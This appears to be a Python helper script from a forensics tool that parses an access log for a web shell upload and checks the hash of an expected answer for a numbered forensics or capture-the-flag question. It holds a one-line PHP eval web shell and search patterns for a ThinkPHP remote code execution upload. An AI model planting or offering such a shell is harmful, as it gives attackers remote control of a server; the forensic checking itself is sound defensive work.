# -*- coding: utf-8 -*-
import sys, json, hashlib, os, re
sys.path.insert(0, r'D:\MemLens')
from memlens.core.server_forensics import parse_webshell

d = r'D:\MemLens\work\extracted\access.log'
print('access.log:', os.path.exists(d), os.path.getsize(d) if os.path.exists(d) else '')
t = open(d, 'rb').read().decode('utf-8', 'replace')
ws = parse_webshell(t)
print(json.dumps(ws, ensure_ascii=False, indent=1))

# 期望值：WP 题 12 的 md5/sha256
want = "<?php @eval(\$_POST['peiqi'])?>"
print('\n手工核对：')
print('  payload  =', want)
print('  sha256   =', hashlib.sha256(want.encode()).hexdigest().upper())

# 顺带看 access.log 里 POST /upload 那一行原文
for line in t.splitlines():
    if 'invokefunction' in line and ('upload' in line or 'file_put_contents' in line):
        print('\n上传行:', line[:400])
